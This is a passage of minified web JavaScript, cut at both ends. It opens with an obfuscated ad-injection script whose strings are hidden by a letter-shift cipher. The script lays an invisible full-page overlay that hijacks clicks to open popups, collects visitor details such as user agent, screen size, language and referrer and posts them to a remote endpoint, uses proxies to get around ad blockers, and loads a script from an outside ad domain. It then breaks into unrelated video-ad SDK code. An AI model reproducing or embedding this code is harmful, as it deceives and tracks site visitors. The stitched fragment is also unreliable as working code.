s(n[e.L])[e.IK]():u[e.Pk](fr)[e.eb](p=>p[e.DM](e.FE)))[e.Pk](ur)[e.oj](),M=new s(o)[e.cE]()[e.Pk](or),d=M[e.vM](),b=M[e.vM]()[e.Pk](qr)[e.vM]();n[e.e]=a(b/Ct,e.LK)+e.U,n[e.L]=n[e.L]?n[e.L]:new s(o)[e.xM](),n[e.t]=nr(d+Tt)}catch(o){n[e.t]=e.Fb}}}function Bn(n,t){let r=new ut(t);r[e.XK]=n,Kr[e.fk](r)}function Nn(n,t){return C[e.TM](e.v,e.MK(e.SK,t))[e.NK]((r,f)=>Mt(n,f))[e.EK](e.AK)}var Tn=e.U,Ye=e.MK(),Fn=e.MK(),An=e.MK();Ye[e.o]=pn,q[e.T](e.P,ye(Ye,ce,Tn));var dr=Ye[e.SK]*e.Tr;Fn[e.o]=Nn(sn,dr),An[e.o]=xn,q[e.T](e.P,ye(Fn,ce,e.Tr)),q[e.T](e.P,ye(An,ce,Tn));var Ln=e.f,pe=e.xr,ir=e.W,cr=e.l;function Xn(n){let t=a(n,e.LK)[e.IK](e.lK),r=[Ln,t][e.EK](cr),f=[Ln,t][e.EK](ir);return[r,f]}function zr(n,t){let[r,f]=Xn(n);j[r]=e.J,j[f]=t}function ar(n){let[t,r]=Xn(n),f=a(j[t],e.LK)||e.J,u=j[r];return f>=e.i?(delete j[t],delete j[r],e.v):u?(j[t]=f+e.U,u):e.v}function br(n){let t=new s()[e.xM]();try{j[pe]=e.h[e.CK](t,e.gb)[e.CK](n)}catch(r){}}function jr(){try{if(!j[pe])return e.h;let[n,t]=j[pe][e.Pk](e.gb);return a(n,e.LK)+e.Zj<new s()[e.xM]()?(delete j[pe],e.h):t}catch(n){return e.h}}var mr=e.rr,Er=e.Kr,Qe=e.jr,lr=e.kr,Zn=e.Mr,He=e.br,xe=e.Er,se=e.Yr,Dn=e.Sr,yr=e.gr,pr=e.Cr,xr=e.Gr,Oe=e.hr,Rn=e.vr,he=!e.U;function sr(){return e.eK[e.CK](m,e.tK)}function ne(){return Un()}function hr(){let n=e.MK(),t=fe(()=>{Re()&&(H(t),Ve())},e.ok);n[e.aK]=Fe,q[e.PK](n,e.fK)}function Ve(n){let t=new q[e.Tj];t[e.Pj](yr,e.Dk[e.CK](tr())),n&&t[e.rM](Qe,lr),t[e.rM](xr,k[A]),t[e.fj]=()=>{if(t[e.lb]===e.wb){let r=t[e.bE]()[e.VE]()[e.Pk](e.yj(e.HE,e.h)),f=e.MK();r[e.X](u=>{let o=u[e.Pk](e.oE),M=o[e.vM]()[e.eM](),d=o[e.EK](e.oE);f[M]=d}),f[Oe]?(he=!e.J,Ee(f[Oe]),n&&br(f[Oe])):f[Rn]&&Ee(f[Rn]),n||Ze()}},t[e.Rr]=()=>{n&&(he=!e.J,Ee(e.YE))},kt(),t[e.xk]()}function Yn(n){return new O((t,r)=>{let f=new s()[e.xM](),u=fe(()=>{let o=Un();o?(H(u),o===e.tE&&r(new I(e.tr)),he&&(n||rr(),t(o)),t()):f+e.lE<new s()[e.xM]()&&(H(u),r(new I(e.TE)))},e.ok)})}function wr(){let n=jr();if(n)he=!e.J,Ee(n);else{let t=fe(()=>{Re()&&(H(t),Ve(!e.J))},e.ok)}}var Qn=e.Or,wK=e.gK[e.CK](m,e.GK),Ge=e.Wr,JK=vt*e.Pr,gK=_t*e.mr;q[Ge]||(q[Ge]=e.MK());function Jr(n){try{let t=e.h[e.CK](Qn)[e.CK](n),r=an[t]||j[t];if(r)return new s()[e.xM]()>a(r,e.LK)}catch(t){}return!e.J}function Hn(n){let t=new s()[e.xM]()+e.Zj,r=e.h[e.CK](Qn)[e.CK](n);q[Ge][n]=!e.J;try{j[r]=t}catch(f){}try{an[r]=t}catch(f){}}var Q=w[e.fr],gr=Q[e.yK](e.yj(e.KM,e.h))||[],Ur=Q[e.yK](e.yj(e.jM,e.h))||[],On=a(gr[e.U],e.LK)||a(Ur[e.U],e.LK),we=e.yj(e.ij,e.h)[e.hK](Q),Pr=e.yj(e.rK,e.KK)[e.hK](Q),Vn=we||Pr,vr=e.yj(e.wj,e.h)[e.hK](Q),_r=e.yj(e.Ij,e.lj)[e.hK](Q),Cr=e.yj(e.kM,e.KK)[e.hK](Q)&&e.yj(e.MM,e.KK)[e.hK](Q),P,te,Se=!e.U,Gn=!e.U,Sn=g(yn),Br=[e.vK,e.H,e.OK,e.WK,e.cK];function Nr(n,t){let r=!Cr&&On<e.bM;n[e.T]?(we||(On&&!Vn?n[e.T](e.vK,t,!e.J):(_r||vr)&&!Vn?n[e.T](e.H,t,!e.J):(n[e.T](e.H,t,!e.J),n[e.T](e.OK,t,!e.J))),r?we?n[e.T](e.WK,t,!e.J):n[e.T](e.cK,t,!e.J):we&&n[e.T](e.H,t,!e.J)):i[e.sj]&&n[e.sj](e.E,t)}function Ie(n){!Jr(n)||Gn||(Gn=n===m,P=i[e.pK](e.cr),P[e.xK][e.iM]=e.EM,P[e.xK][e.rk]=e.J,P[e.xK][e.wM]=e.J,P[e.xK][e.IM]=e.J,P[e.xK][e.lM]=e.J,P[e.xK][e.ur]=e.Tk,P[e.xK][e.sM]=e.YM,te=t=>{if(Se)return;t[e.SE](),t[e.gE](),qe();let r=Rt(e.Dk[e.CK](Sn,e.nE)[e.CK](n,e.pE));r&&n===F?Hn(n):r&&n===m&&N(()=>{r[e.sE]||Hn(n)},e.mr)},Nr(P,te),i[e.PM][e.Yk](P),Se=!e.U)}function qe(){try{Br[e.X](n=>{q[e.zK](n,te,!e.J),q[e.zK](n,te,!e.U)}),P&&i[e.PM][e.gk](P),te=void e.J}catch(n){}Se=!e.J}function We(){return te===void e.J}function In(n){Sn=n}var Tr=e.cr,Wn=i[e.pK](Tr),Fr=e.pr,Ar=e.Br,Lr=e.Qr,Xr=e.Vr,Zr=e.Hr,Dr=e.nr;Wn[e.xK][e.ur]=Fr,Wn[e.xK][e.zr]=Ar;function Rr(n){let t=C[e.KE][e.kK][e.Sk](i[e.Tb])[e.FK](r=>r[e.xb]===n)[e.oj]()[e.Dj];return(t[e.J][e.fM][e.DM](e.AM)?t[e.J][e.xK][e.SM]:t[e.V][e.xK][e.SM])[e.kK](e.U,-e.U)}function $e(n){return Kt(g(n)[e.Pk](e.h)[e.NK](function(t){return e.jE+(e.Bk+t[e.Aj](e.J)[e.IK](e.uE))[e.kK](-e.V)})[e.EK](e.h))}function ke(n){let t=g(n),r=new rt(t[e.SK]);return new ve(r)[e.NK]((f,u)=>t[e.Aj](u))}function Yr(n,t){return new O((r,f)=>{let u=i[e.pK](Lr);u[e.xb]=n,u[e.Pb]=Xr,u[e.pM]=Dr,u[e.fb]=Zr,i[e.ib][e.xE](u,i[e.ib][e.kE]),u[e.fj]=()=>{try{let o=Rr(u[e.xb]);u[e.JM][e.gk](u),r(t===xe?ke(o):$e(o))}catch(o){f()}},u[e.Rr]=()=>{u[e.JM][e.gk](u),f()}})}function Qr(n,t){return new O((r,f)=>{let u=new ot;u[e.fb]=e.tb,u[e.Ek]=n,u[e.fj]=()=>{let o=i[e.pK](e.JE);o[e.Mk]=u[e.Mk],o[e.JK]=u[e.JK];let M=o[e.UE](e.dE);M[e.QE](u,e.J,e.J);let{data:d}=M[e.ZE](e.J,e.J,u[e.Mk],u[e.JK]),b=d[e.kK](e.J,e.zE)[e.FK]((E,Z)=>(Z+e.U)%e.d)[e.zj]()[e.sK]((E,Z,Ke)=>E+Z*c[e.EE](e.PE,Ke),e.J),p=[];for(let E=e.zE;E<d[e.SK];E++)if((E+e.U)%e.d){let Z=d[E];(t===xe||Z>=e.qE)&&p[e.Hj](v[e.Kj](Z))}let l=L(p[e.EK](e.h)[e.yE](e.J,b)),J=t===xe?ke(l):$e(l);return r(J)},u[e.Rr]=()=>f()})}function Hr(n,t,r=He,f=se,u=e.MK()){return new O((o,M)=>{let d=new q[e.Tj];if(d[e.Pj](f,n),d[e.nM]=r,d[e.rE]=!e.J,d[e.rM](mr,L(B(t))),d[e.fj]=()=>{let b=e.MK();b[e.lb]=d[e.lb],b[e.Nr]=r===He?U[e.BE](d[e.Nr]):d[e.Nr],[e.wb,e.RE][e.LM](d[e.lb])>=e.J?o(b):M(new I(e.rY[e.CK](d[e.lb],e.oM)[e.CK](d[e.fE],e.mE)[e.CK](t)))},d[e.Rr]=()=>{M(new I(e.rY[e.CK](d[e.lb],e.oM)[e.CK](d[e.fE],e.mE)[e.CK](t)))},f===Dn){let b=typeof u==e.GE?U[e.BE](u):u;d[e.rM](Qe,Zn),d[e.xk](b)}else d[e.xk]()})}function Or(n,t,r=He,f=se,u=e.MK()){return new O((o,M)=>{let d=Ot(n),b=Vt(),p=!e.U,l,J,E=()=>{try{b[e.JM][e.gk](b),q[e.zK](e.P,Z),p||M(new I(e.xY))}catch(Ke){}};function Z(Ke){let de=ue[e.rb](Ke[e.tM])[e.oj]();if(de===d)if(cn(J),Ke[e.tM][de]===e.v){let D=e.MK();D[de]=e.MK(e.DE,e.AE,e.cM,L(B(t)),e.QM,f,e.BM,typeof u==e.GE?U[e.BE](u):u),f===Dn&&(D[de][e.eE]=U[e.BE](e.MK(e.jr,Zn))),b[e.FM][e.PK](D,e.fK)}else{p=!e.J,E(),cn(l);let D=e.MK(),dn=U[e.bK](g(Ke[e.tM][de]));D[e.lb]=dn[e.iE],D[e.Nr]=r===xe?ke(dn[e.BM]):$e(dn[e.BM]),[e.wb,e.RE][e.LM](D[e.lb])>=e.J?o(D):M(new I(e.rY[e.CK](D[e.lb],e.mE)[e.CK](t)))}}q[e.T](e.P,Z),b[e.Ek]=n,(i[e.BM]||i[e.PM])[e.Yk](b),J=N(E,e.ME),l=N(E,e.Fr)})}function Je(n){try{return n[e.Pk](e.iK)[e.V][e.Pk](e.DK)[e.kK](-e.V)[e.EK](e.DK)[e.eM]()}catch(t){return e.h}}var Me=e.ar,Vr=e.Xr,Gr=e.O,Sr=e.l,Ir=e.Jr,G=e.MK();G[e.Ur]=e.O,G[e.dr]=e.W,G[e.Zr]=e.c,G[e.ir]=e.p,G[e.wr]=e.B,G[e.Ir]=e.Q;function $n(n,t){let r=G[t]||Sr,f=a(n,e.LK)[e.IK](e.lK),u=[Me,f][e.EK](r),o=[Me,f,Vr][e.EK](r),M=[Me,f,Gr][e.EK](r);return[u,o,M]}function Wr(){let n=j[Me];if(n)return n;let t=c[e.A]()[e.IK](e.lK)[e.kK](e.V);return j[Me]=t,t}function $r(n){let t=e.gM[e.CK](ne(),e.CM),r=ue[e.rb](n)[e.NK](u=>{let o=ft(n[u]);return[u,o][e.EK](e.CE)})[e.EK](e.GM),f=new q[e.Tj];f[e.Pj](e.Sr,t,!e.J),f[e.rM](Qe,pr),f[e.xk](r)}function ge(n,t){let[r,f,u]=$n(n,t),o=a(j[u],e.LK)||e.J;j[u]=o+e.U,j[r]=new s()[e.xM](),j[f]=e.h}function Ue(n,t,r){let[f,u,o]=$n(n,t);if(j[f]&&!j[u]){let M=a(j[o],e.LK)||e.J,d=a(j[f],e.LK),b=new s()[e.xM](),p=b-d,{referrer:l}=i,J=q[e.nj][e.xb];j[u]=b,j[o]=e.J;let E=e.MK(e.Cb,n,e.Gb,l,e.hb,p,e.vb,r,e.Ob,b,e.Wb,Wr(),e.cb,J,e.pb,d,e.Bb,M,e.Qb,w[e.fr],e.Vb,q[e.uj][e.Mk],e.Hb,q[e.uj][e.JK],e.QM,t||Ir,e.nb,new s()[e.mj](),e.ub,Je(r),e.zb,Je(l),e.ab,Je(J),e.Xb,w[e.yb]||w[e.Lb]);$r(E)}}var kr=e.yj(e.BK,e.KK),eK=e.yj(e.QK),nK=e.yj(e.VK),tK=e.lr,kn=[tK,m[e.IK](e.lK)][e.EK](e.h),re=e.MK();re[e.W]=oK,re[e.B]=qK,re[e.Q]=nn,re[e.Xr]=et;var rK=[nn,et];function KK(n){return kr[e.hK](n)?n:eK[e.hK](n)?e.hM[e.CK](n):nK[e.hK](n)?e.Dk[e.CK](q[e.nj][e.Ib])[e.CK](n):q[e.nj][e.xb][e.Pk](e.iK)[e.kK](e.J,-e.U)[e.CK](n)[e.EK](e.iK)}function fK(){let n=[j[kn]][e.CK](ue[e.rb](re));return n[e.FK]((t,r)=>t&&n[e.LM](t)===r)}function uK(){return[...rK]}function en(n,t,r,f,u){let o=n[e.vM]();return f&&f!==se?o?o(t,r,f,u)[e.xj](M=>M)[e.RK](()=>en(n,t,r,f,u)):nn(t,r,f,u):o?re[o](t,r||e.Nb)[e.xj](M=>(j[kn]=o,M))[e.RK](()=>en(n,t,r,f,u)):new O((M,d)=>d())}function oK(n,t){X(e.qK);let r=e.ir,f=De(),u=e.Dk[e.CK](ne(),e.iK)[e.CK](f,e.Kb)[e.CK](L(n));return Yr(u,t)[e.xj](o=>(ge(m,r),o))[e.RK](o=>{throw Ue(m,r,u),o})}function qK(n,t){X(e.mK);let r=e.wr,f=De(),u=e.Dk[e.CK](ne(),e.iK)[e.CK](f,e.jb)[e.CK](L(n));return Qr(u,t)[e.xj](o=>(ge(m,r),o))[e.RK](o=>{throw Ue(m,r,u),o})}function nn(n,t,r,f){X(e.oK);let u=e.Ir,o=De(),M=e.Dk[e.CK](ne(),e.iK)[e.CK](o,e.OM);return Hr(M,n,t,r,f)[e.xj](d=>(ge(m,u),d))[e.RK](d=>{throw Ue(m,u,M),d})}function et(n,t,r,f){X(e.WM),wn(ne());let u=e.TK,o=Ht();return Or(o,n,t,r,f)[e.xj](M=>(ge(m,u),M))[e.RK](M=>{throw Ue(m,u,o),M})}function tn(n,t,r,f){n=KK(n),r=r?r[e.kb]():e.h;let u=r&&r!==se?uK():fK();return X(e.h[e.CK](r,e.m)[e.CK](n)),en(u,n,t,r,f)[e.xj](o=>o&&o[e.Nr]?o:e.MK(e.lb,e.wb,e.Nr,o))}var rn=e.sr,Kn=e.Dr,MK=e.Ar,dK=e.er,iK=e.tr,cK=e.yr,zK=e.Lr,aK=e.Nr,fn,un;function on(n){let t=n&&n[e.tM]&&n[e.tM][e.cM],r=n&&n[e.tM]&&n[e.tM][e.pM],f=n&&n[e.tM]&&n[e.tM][e.BM],u=n&&n[e.tM]&&n[e.tM][e.QM],o=n&&n[e.tM]&&n[e.tM][e.VM],M=n&&n[e.tM]&&n[e.tM][e.HM],d=n&&n[e.tM]&&n[e.tM][e.nM],b=n&&n[e.tM]&&n[e.tM][e.uM],p=b===m||b===F,l=e.MK();o!==rn&&o!==Kn||(r===MK?(l[e.pM]=dK,l[e.sb]=A,l[e.uM]=m,l[e.Db]=F):r===iK&&M&&(!b||p)&&(l[e.pM]=cK,l[e.HM]=M,tn(t,d,u,f)[e.xj](J=>{let E=e.MK();E[e.pM]=aK,E[e.cM]=t,E[e.HM]=M,E[e.tM]=J,qn(o,E)})[e.RK](J=>{let E=e.MK();E[e.pM]=zK,E[e.cM]=t,E[e.HM]=M,E[e.Fb]=J&&J[e.P],qn(o,E)})),l[e.pM]&&qn(o,l))}function qn(n,t){switch(t[e.VM]=n,n){case Kn:un[e.PK](t);break;case rn:default:fn[e.PK](t);break}q[e.PK](t,e.fK)}function bK(){try{fn=new zn(rn),fn[e.T](e.P,on),un=new zn(Kn),un[e.T](e.P,on)}catch(n){}q[e.T](e.P,on)}var nt=i[e.qr];function jK(n,t,r){return new O((f,u)=>{X(e.Ab);let o;if([e.d,e.i,e.Z][e.LM](A)>-e.U){o=i[e.pK](e.zM);let M=i[e.hE](n);o[e.fj]=r,o[e.Yk](M),o[e.vE](e.OE,m),o[e.vE](e.WE,Je(g(ln)));try{nt[e.JM][e.xE](o,nt)}catch(d){(i[e.BM]||i[e.PM])[e.Yk](o)}}else R(n);N(()=>(o!==void e.J&&o[e.JM][e.gk](o),Jn(t)?(X(e.aE),f()):u()))})}function mK(n,t){let r=n===e.U?sr():g(ln);return tn(r,e.v,e.v,e.v)[e.xj](f=>(f=f&&e.Nr in f?f[e.Nr]:f,f&&zr(m,f),f))[e.RK](()=>ar(m))[e.xj](f=>{f&&jK(f,n,t)})}It();function Pe(n){return Jn()?e.v:(X(e.yM),Wt(),tt(n))}function tt(n){return A===e.U&&We()&&Ie(m),Re()?(Ve(),q[wt]=tn,Yn()[e.xj](t=>{if(t&&A===e.U){let r=new q[e.Tj];r[e.Pj](e.Yr,e.Dk[e.CK](t)),r[e.rM](Er,m),In(t),r[e.fj]=()=>{let f=i[e.pK](e.zM),u=i[e.hE](r[e.Nr][e.sk](e.yj(e.kY,e.qM),o()));f[e.fj]=n;function o(){let M=e.jY[e.CK](c[e.A]()[e.IK](e.lK)[e.kK](e.V));return q[M]=q[e.Ub],M}f[e.Yk](u),(i[e.BM]||i[e.PM])[e.Yk](f),N(()=>{f!==void e.J&&(f[e.JM][e.gk](f),qe())})},r[e.xk]();return}mK(A,n)[e.xj](()=>{En([m,F],ne())})})):N(tt,e.ok)}function EK(){We()&&Ie(F),St(n=>{try{return n&&We()&&(qe(),Ie(m)),wr(),Yn(!e.J)[e.xj](t=>{Mn(n,t)})[e.RK](()=>{Mn(n)})}catch(t){return Mn(n)}})}function Mn(n,t){let r=t||g(yn);In(r);let f=i[e.pK](e.zM);f[e.Rr]=()=>{qe(),Pe()},f[e.fj]=()=>{qe()},f[e.Ek]=e.gM[e.CK](r,e.Jb)[e.CK](n?m:F),(i[e.BM]||i[e.PM])[e.Yk](f)}q[Lt]=Pe,q[Xt]=Pe,N(Pe,e.Fr),Bn(Fe,Te),Bn(ce,Ne),bK(),Zt&&A===e.U&&EK();try{$}catch(n){}})()})(ue.entries({x:"AzOxuow",r:"Bget zafuruomfuaz (TFFB)",K:"Bget zafuruomfuaz (TFFBE)",j:"Bget zafuruomfuaz (Pagnxq Fms)",k:"Uzfqdefufumx",M:"Zmfuhq",b:"Uz-Bmsq Bget",E:"azoxuow",Y:"zmfuhq",S:"bgetqd-gzuhqdemx",g:"qz",C:"rd",G:"pq",h:"",v:null,O:"e",W:"o",c:"v",p:"k",B:"b",Q:"j",V:2,H:"oxuow",n:"fagot",u:"7.0.9",z:"lrsbdajktffb",a:"lrsradymfe",X:"radQmot",J:0,U:1,d:4,Z:5,i:3,w:6,I:7,l:"g",s:"fdkFab",D:"sqfBmdqzfZapq",A:"dmzpay",e:"fuyqe",t:"ogddqzf",y:"dqmpk",L:"pmfq",N:"fxp",F:"\r\n",q:",",R:"F",m:":",o:"dmi",T:"mppQhqzfXuefqzqd",P:"yqeemsq",f:"yspn9a79sh",xr:"q5qedx1ekg5",rr:"Fawqz",Kr:"Rmhuoaz",jr:"Oazfqzf-Fkbq",kr:"fqjf/tfyx",Mr:"mbbxuomfuaz/veaz",br:"veaz",Er:"nxan",Yr:"SQF",Sr:"BAEF",gr:"TQMP",Cr:"mbbxuomfuaz/j-iii-rady-gdxqzoapqp; otmdeqf=GFR-8",Gr:"Mooqbf-Xmzsgmsq",hr:"j-mbbxuomfuaz-wqk",vr:"j-mbbxuomfuaz-fawqz",Or:"__PX_EQEEUAZ_",Wr:"lrspxbabgb",cr:"puh",pr:999999,Br:"gdx(pmfm:uymsq/sur;nmeq64,D0xSAPxtMCMNMUMMMMMMMB///kT5NMQMMMMMXMMMMMMNMMQMMMUNDMM7)",Qr:"xuzw",Vr:"efkxqetqqf",Hr:"mzazkyage",nr:"fqjf/oee",ur:"lUzpqj",zr:"nmowsdagzpUymsq",ar:"zdm8od49pds",Xr:"r",Jr:"gzwzaiz",Ur:"PQXUHQDK_VE",dr:"PQXUHQDK_OEE",Zr:"BDAJK_VE",ir:"BDAJK_OEE",wr:"BDAJK_BZS",Ir:"BDAJK_JTD",lr:"f4wp70p8osq",sr:"gwtrajlpasc",Dr:"wmtityzzu",Ar:"buzs",er:"bazs",tr:"dqcgqef",yr:"dqcgqef_mooqbfqp",Lr:"dqcgqef_rmuxqp",Nr:"dqebazeq",Fr:1e4,qr:"ogddqzfEodubf",Rr:"azqddad",mr:1e3,or:"zmh",Tr:42,Pr:36e5,fr:"geqdMsqzf",xK:"efkxq",rK:"mzpdaup",KK:"u",jK:"iuzpaie zf",kK:"exuoq",MK:function(){let e={},q=[].slice.call(arguments);for(let i=0;i<q.length-1;i+=2)e[q[i]]=q[i+1];return e},bK:"bmdeq",EK:"vauz",YK:"([^m-l0-9]+)",SK:"xqzsft",gK:"__BBG_EQEEUAZ_1_",CK:"oazomf",GK:"_rmxeq",hK:"fqef",vK:"yageqpaiz",OK:"yageqgb",WK:"fagotqzp",cK:"fagotefmdf",pK:"odqmfqQxqyqzf",BK:"^tffbe?:",QK:"^//",VK:"^/",HK:48,nK:9,uK:"0",zK:"dqyahqQhqzfXuefqzqd",aK:"up",XK:"fmdsqfUp",JK:"tqustf",UK:"iuz",dK:"pao",ZK:"paoQxqyqzf",iK:"/",wK:".tfyx",IK:"faEfduzs",lK:36,sK:"dqpgoq",DK:".",AK:"!",eK:"//vayfuzsu.zqf/mbg.btb?lazqup=",tK:"&ar=1",yK:"ymfot",LK:10,NK:"ymb",FK:"ruxfqd",qK:"dqcgqefNkOEE",RK:"omfot",mK:"dqcgqefNkBZS",oK:"dqcgqefNkJTD",TK:"BDAJK_RDMYQ",PK:"baefYqeemsq",fK:"*",xj:"ftqz",rj:57,Kj:"rdayOtmdOapq",jj:35,kj:768,Mj:1024,bj:568,Ej:360,Yj:1080,Sj:736,gj:900,Cj:864,Gj:812,hj:667,vj:800,Oj:240,Wj:300,cj:"qz-GE",pj:"qz-SN",Bj:"qz-OM",Qj:"qz-MG",Vj:"eh-EQ",Hj:"bget",nj:"xaomfuaz",uj:"eodqqz",zj:"dqhqdeq",aj:"eod",Xj:"1bj",Jj:"mnagf:nxmzw",Uj:"BTB",dj:"VE",Zj:18e5,ij:"uBtazq|uBmp|uBap",wj:"Hqdeuaz\\/[^E]+Emrmdu",Ij:"rudqraj",lj:"su",sj:"mffmotQhqzf",Dj:"oeeDgxqe",Aj:"otmdOapqMf",ej:97,tj:122,yj:function(e,q){return new z(e,q)},Lj:60,Nj:120,Fj:480,qj:180,Rj:720,mj:"sqfFuyqlazqArreqf",oj:"bab",Tj:"JYXTffbDqcgqef",Pj:"abqz",fj:"azxamp",xk:"eqzp",rk:"fab",Kk:"lazqUp",jk:"radymf",kk:"urdmyq",Mk:"iupft",bk:"abmoufk",Ek:"edo",Yk:"mbbqzpOtuxp",Sk:"omxx",gk:"dqyahqOtuxp",Ck:"B",Gk:"Z",hk:"B/Z",vk:"Z/B",Ok:"B/Z/Z",Wk:"Z/B/Z",ck:"B/Z/B/Z",pk:"Z/Z/Z/Z",Bk:"00",Qk:"000",Vk:"0000",Hk:"00000",nk:"zqie",uk:"bmsqe",zk:"iuwu",ak:"ndaieq",Xk:"huqi",Jk:"yahuq",Uk:"mdfuoxq",dk:"mdfuoxqe",Zk:"efmfuo",ik:"bmsq",wk:"uzpqj",Ik:"iqn",lk:"rxaad",sk:"dqbxmoq",Dk:"tffbe://",Ak:3571,ek:"ep",tk:"sgy",yk:"bwqk",Lk:"befduzs",Nk:"begrrujqe",Fk:"mfan",qk:"DqsQjb",Rk:"pqoapqGDUOaybazqzf",mk:"Ymft",ok:100,Tk:2147483647,Pk:"ebxuf",fk:"puebmfotQhqzf",xM:"sqfFuyq",rM:"eqfDqcgqefTqmpqd",KM:"Otdayq\\/([0-9]{1,})",jM:"OduAE\\/([0-9]{1,})",kM:"Mzpdaup",MM:"Rudqraj",bM:56,EM:"rujqp",YM:"mgfa",SM:"oazfqzf",gM:"//",CM:"/qhqzf",GM:"&",hM:"tffbe:",vM:"eturf",OM:".veaz",WM:"dqcgqefNkUrdmyq",cM:"gdx",pM:"fkbq",BM:"napk",QM:"yqftap",VM:"otmzzqx",HM:"dqcgqef_up",nM:"dqebazeqFkbq",uM:"lazqup_mpnxaow",zM:"eodubf",aM:"rb",XM:"fzqyqxQfzqygoap",JM:"bmdqzfZapq",UM:16807,dM:"mnopqrstuvwxyzabcdefghijkl",ZM:27,iM:"baeufuaz",wM:"xqrf",IM:"dustf",lM:"naffay",sM:"bauzfqdQhqzfe",DM:"uzoxgpqe",AM:".iupsqf-oax-10-eb",eM:"faXaiqdOmeq",tM:"pmfm",yM:"efmdfXampuzs",LM:"uzpqjAr",NM:"pmfmeqf",FM:"oazfqzfIuzpai",qM:"s",RM:"Mphqdf1",mM:"MMN ",oM:" ",TM:"mbbxk",PM:"paogyqzfQxqyqzf",fM:"eqxqofadFqjf",xb:"tdqr",rb:"wqke",Kb:".oee?",jb:".bzs?",kb:"faGbbqdOmeq",Mb:"hqdeuaz",bb:"eagdoqLazqUp",Eb:"paymuz",Yb:"sqzqdmfuazFuyq",Sb:"qjfdm",gb:"|",Cb:"lazqup",Gb:"dqrqddqd",hb:"fuyq_purr",vb:"rmuxqp_gdx",Ob:"rmux_fuyq",Wb:"geqd_up",cb:"ogddqzf_gdx",pb:"xmef_egooqee",Bb:"egooqee_oagzf",Qb:"geqd_msqzf",Vb:"eodqqz_iupft",Hb:"eodqqz_tqustf",nb:"fuyqlazq",ub:"rmuxqp_gdx_paymuz",zb:"dqrqddqd_paymuz",ab:"ogddqzf_gdx_paymuz",Xb:"ndaieqd_xmzs",Jb:"/5/",Ub:"paogyqzf",db:"eqxqofad",Zb:"oazfqzfPaogyqzf",ib:"tqmp",wb:200,Ib:"taef",lb:"efmfge",sb:"omxxeusz",Db:"lazqup_adusuzmx",Ab:"efmdfUzvqofEodubfOapq",eb:"ruzp",tb:"geq-odqpqzfumxe",yb:"xmzsgmsq",Lb:"geqdXmzsgmsq",Nb:"fqjf",Fb:"qddad",qb:"sqfQxqyqzfeNkFmsZmyq",Rb:"eagdeqPuh",mb:"dqxmfuhq",ob:"hmxgq",Tb:"efkxqEtqqfe",Pb:"dqx",fb:"odaeeAdusuz",xE:"uzeqdfNqradq",rE:"iuftOdqpqzfumxe",KE:"bdafafkbq",jE:"%",kE:"rudefOtuxp",ME:2e3,bE:"sqfMxxDqebazeqTqmpqde",EE:"bai",YE:"6g90tD4d4Dd1r8xzjbbl",SE:"bdqhqzfPqrmgxf",gE:"efabUyyqpumfqBdabmsmfuaz",CE:"=",GE:"anvqof",hE:"odqmfqFqjfZapq",vE:"eqfMffdungfq",OE:"pmfm-lazq-up",WE:"pmfm-paymuz",cE:"faUEAEfduzs",pE:"?pahd=fdgq",BE:"efduzsurk",QE:"pdmiUymsq",VE:"fduy",HE:"[\\d\\z]+",nE:"/4/",uE:16,zE:12,aE:"qzpUzvqofEodubfOapq",XE:"nxaow",JE:"omzhme",UE:"sqfOazfqjf",dE:"2p",ZE:"sqfUymsqPmfm",iE:"efmfge_oapq",wE:"puebxmk",IE:30,lE:5e3,sE:"oxaeqp",DE:"f",AE:"baef",eE:"tqmpqde",tE:"qddad.oay",yE:"egnefduzs",LE:"eturfEfduzs ",NE:"ruxx",FE:"pmfq:",qE:32,RE:204,mE:"' ituxq dqcgqefuzs ",oE:": ",TE:"fuyqagf",PE:256,fE:"efmfgeFqjf",xY:"qddad dqcgqef fuyqagf",rY:"qddad '",KY:8,jY:"_",kY:"paogyqzf\\n"}).reduce((e,q)=>(ue.defineProperty(e,q[0],{get:()=>typeof q[1]!="string"?q[1]:q[1].split("").map(i=>{let w=i.charCodeAt(0);return w>=65&&w<=90?v.fromCharCode((w-65+26-12)%26+65):w>=97&&w<=122?v.fromCharCode((w-97+26-12)%26+97):i}).join("")}),e),{}),window,qt,h)});})();</script><script src="//madurird.com/tag.min.js" data-zone="9352771" data-cfasync="false" async onerror="_lxtqolz()" onload="_xivfmvdp()"></script>
</body>');
        if (Ud ||
            Qd || wd) {
            var b = this.l.contentWindow;
            b && wB(b.document, a)
        } else xB(this.l, a)
    };
    UC.prototype.M = function(a) {
        try {
            var b = a.g.data;
            try {
                var c = JSON.parse(b)
            } catch (ka) {
                return
            }
            var d = c.session;
            if (null != d && this.D == d) switch (c.type) {
                case "friendlyReady":
                    var e = VC(this);
                    if (null != e) {
                        this.g = e;
                        this.H = e.currentSrc;
                        var f = e.style.cssText;
                        if (vd && 10 > document.documentMode) var g = Ec;
                        else {
                            var h = document;
                            "function" === typeof HTMLTemplateElement && (h = vf(document, "TEMPLATE").content.ownerDocument);
                            var k = h.implementation.createHTMLDocument("").createElement("DIV");
                            k.style.cssText = f;
                            g = TC(k.style)
                        }
                        this.J = g;
                        this.K =
                            e.currentTime
                    } else {
                        var n = this.h.G,
                            m = this.h.M;
                        var v = "border: 0; margin: 0; padding: 0; position: absolute; width:" + (m.width + "px; ");
                        v += "height:" + m.height + "px;";
                        this.g = xf("VIDEO", {
                            style: v,
                            autoplay: !0
                        });
                        n.appendChild(this.g)
                    }
                    var r = this.h.G;
                    e = "border: 0; margin: 0; padding: 0;position: absolute; ";
                    var w = qg(this.g);
                    e += "width:" + w.width + "px; ";
                    e += "height:" + w.height + "px;";
                    this.C = xf("DIV", {
                        style: e
                    });
                    r.appendChild(this.C);
                    try {
                        this.l.contentWindow.loader.initFriendly(this.g, this.C)
                    } catch (ka) {
                        WC(this)
                    }
                    Dy(this.o,
                        "vpaid", "", b);
                    break;
                case "becameLinear":
                    this.g && !Ef() && !Df() && ig(this.g, {
                        visibility: "visible"
                    });
                    Dy(this.o, "vpaid", "", b);
                    break;
                case "becameNonlinear":
                    XC(this);
                    Dy(this.o, "vpaid", "", b);
                    break;
                case "startAd":
                    r = {};
                    if (this.g) {
                        h = this.g.paused;
                        var x = 0 < this.g.currentTime;
                        r.apl = x && !h ? "1" : "0";
                        r.ip = h ? "1" : "0";
                        r.iavp = x ? "1" : "0"
                    } else r.apl = "n";
                    eA().report(99, r);
                    Dy(this.o, "vpaid", "", b);
                    if (null != VC(this)) {
                        var H = this.h;
                        null != H.h && H.h.show()
                    }
                    break;
                default:
                    Dy(this.o, "vpaid", "", b)
            }
        } catch (ka) {
